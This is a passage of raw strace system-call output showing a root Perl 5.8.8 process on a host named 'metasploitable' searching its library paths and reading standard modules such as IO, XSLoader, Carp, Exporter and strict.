\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
18439 12:54:35.848167 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
18439 12:54:35.848184 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d92000
18439 12:54:35.848194 mmap2(0xb7d9b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d9b000
18439 12:54:35.848208 mmap2(0xb7d9d000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d9d000
18439 12:54:35.848221 close(1)          = 0
18439 12:54:35.848244 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d91000
18439 12:54:35.848256 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d918c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
18439 12:54:35.848309 mprotect(0xb7f0d000, 4096, PROT_READ) = 0
18439 12:54:35.848398 munmap(0xb7f55000, 29913) = 0
18439 12:54:35.848412 set_tid_address(0xb7d91908) = 18439
18439 12:54:35.848439 set_robust_list(0xb7d91910, 0xc) = 0
18439 12:54:35.848448 futex(0xbff78c10, 0x81 /* FUTEX_??? */, 1) = 0
18439 12:54:35.848461 rt_sigaction(SIGRTMIN, {0xb7f172c0, [], SA_SIGINFO}, NULL, 8) = 0
18439 12:54:35.848474 rt_sigaction(SIGRT_1, {0xb7f17340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
18439 12:54:35.848486 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
18439 12:54:35.848499 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
18439 12:54:35.848519 uname({sys="Linux", node="metasploitable", ...}) = 0
18439 12:54:35.848563 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
18439 12:54:35.848607 brk(0)            = 0x8153000
18439 12:54:35.848617 brk(0x8174000)    = 0x8174000
18439 12:54:35.848659 getuid32()        = 0
18439 12:54:35.848669 geteuid32()       = 0
18439 12:54:35.848678 getgid32()        = 0
18439 12:54:35.848686 getegid32()       = 0
18439 12:54:35.848722 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d70000
18439 12:54:35.848749 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
18439 12:54:35.848765 read(1, "?;\223f", 4) = 4
18439 12:54:35.848778 close(1)          = 0
18439 12:54:35.848795 time(NULL)        = 1495644875
18439 12:54:35.848867 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbff788e0) = -1 ENOENT (No such file or directory)
18439 12:54:35.848903 stat64("/usr/local/lib/site_perl/5.8.8", 0xbff788e0) = -1 ENOENT (No such file or directory)
18439 12:54:35.848915 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbff788e0) = -1 ENOENT (No such file or directory)
18439 12:54:35.848934 stat64("/usr/local/lib/perl/5.8.7", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.848946 stat64("/usr/local/share/perl/5.8.7", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.848958 stat64("/usr/local/lib/perl/5.8.6", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.848969 stat64("/usr/local/share/perl/5.8.6", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.848981 stat64("/usr/local/lib/perl/5.8.4", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.848992 stat64("/usr/local/share/perl/5.8.4", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.849003 stat64("/usr/local/lib/perl/5.8.3", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.849014 stat64("/usr/local/share/perl/5.8.3", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.849026 stat64("/usr/local/lib/perl/5.8.2", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.849037 stat64("/usr/local/share/perl/5.8.2", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.849048 stat64("/usr/local/lib/perl/5.8.1", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.849059 stat64("/usr/local/share/perl/5.8.1", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.849071 stat64("/usr/local/lib/perl/5.8.0", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.849082 stat64("/usr/local/share/perl/5.8.0", 0xbff78a20) = -1 ENOENT (No such file or directory)
18439 12:54:35.849104 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff78718) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.849116 _llseek(0, 0, [0], SEEK_CUR) = 0
18439 12:54:35.849127 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff78718) = -1 EBADF (Bad file descriptor)
18439 12:54:35.849137 _llseek(1, 0, 0xbff78760, SEEK_CUR) = -1 EBADF (Bad file descriptor)
18439 12:54:35.849147 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff78718) = -1 EINVAL (Invalid argument)
18439 12:54:35.849158 _llseek(2, 0, 0xbff78760, SEEK_CUR) = -1 ESPIPE (Illegal seek)
18439 12:54:35.849168 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
18439 12:54:35.849180 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff787d8) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.849190 _llseek(1, 0, [0], SEEK_CUR) = 0
18439 12:54:35.849201 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
18439 12:54:35.849212 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
18439 12:54:35.849230 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
18439 12:54:35.849282 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
18439 12:54:35.849441 getppid()         = 18437
18439 12:54:35.849537 stat64("/etc/perl/IO.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.849551 stat64("/etc/perl/IO.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.849564 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.849576 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.849589 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.849601 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.849614 stat64("/usr/lib/perl5/IO.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.849626 stat64("/usr/lib/perl5/IO.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.849639 stat64("/usr/share/perl5/IO.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.849651 stat64("/usr/share/perl5/IO.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.849663 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.849675 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
18439 12:54:35.849701 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 7
18439 12:54:35.849715 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff781e8) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.849725 _llseek(7, 0, [0], SEEK_CUR) = 0
18439 12:54:35.849748 read(7, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
18439 12:54:35.849804 stat64("/etc/perl/XSLoader.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.849817 stat64("/etc/perl/XSLoader.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.849830 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.849842 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.849856 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.849868 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.849881 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.849923 stat64("/usr/lib/perl5/XSLoader.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.849954 stat64("/usr/share/perl5/XSLoader.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.849966 stat64("/usr/share/perl5/XSLoader.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.849979 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.849991 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
18439 12:54:35.850011 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.850025 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.850036 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.850053 read(9, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
18439 12:54:35.850283 brk(0x8195000)    = 0x8195000
18439 12:54:35.850630 _llseek(9, 3407, [3407], SEEK_SET) = 0
18439 12:54:35.850648 _llseek(9, 0, [3407], SEEK_CUR) = 0
18439 12:54:35.850658 close(9)          = 0
18439 12:54:35.850702 stat64("/etc/perl/Carp.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850717 stat64("/etc/perl/Carp.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850730 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850743 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850756 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850768 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850782 stat64("/usr/lib/perl5/Carp.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850793 stat64("/usr/lib/perl5/Carp.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850806 stat64("/usr/share/perl5/Carp.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850817 stat64("/usr/share/perl5/Carp.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850830 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850842 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850855 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.850867 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
18439 12:54:35.850919 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.850951 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.850962 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.850979 read(9, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
18439 12:54:35.851489 read(9, "gmess  @_ }\n\n1;\n", 4096) = 16
18439 12:54:35.856527 read(9, "", 4096) = 0
18439 12:54:35.856527 close(9)          = 0
18439 12:54:35.856528 stat64("/etc/perl/Exporter.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856528 stat64("/etc/perl/Exporter.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856528 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856533 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856547 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856559 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856573 stat64("/usr/lib/perl5/Exporter.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856585 stat64("/usr/lib/perl5/Exporter.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856597 stat64("/usr/share/perl5/Exporter.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856609 stat64("/usr/share/perl5/Exporter.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856622 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856634 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856647 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.856660 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
18439 12:54:35.856681 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.856695 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.856706 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.856723 read(9, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
18439 12:54:35.857249 _llseek(9, 2217, [2217], SEEK_SET) = 0
18439 12:54:35.857266 _llseek(9, 0, [2217], SEEK_CUR) = 0
18439 12:54:35.857276 close(9)          = 0
18439 12:54:35.857416 stat64("/etc/perl/strict.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857433 stat64("/etc/perl/strict.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857447 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857460 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857473 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857486 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857499 stat64("/usr/lib/perl5/strict.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857510 stat64("/usr/lib/perl5/strict.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857523 stat64("/usr/share/perl5/strict.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857535 stat64("/usr/share/perl5/strict.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857547 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857560 stat64("/usr/lib/perl/5.8/strict.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857573 stat64("/usr/share/perl/5.8/strict.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857585 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
18439 12:54:35.857605 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.857620 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.857631 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.857650 read(9, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
18439 12:54:35.857787 _llseek(9, 598, [598], SEEK_SET) = 0
18439 12:54:35.857800 _llseek(9, 0, [598], SEEK_CUR) = 0
18439 12:54:35.857810 close(9)          = 0
18439 12:54:35.857895 stat64("/etc/perl/warnings.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857911 stat64("/etc/perl/warnings.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857924 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857936 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857950 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.857963 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
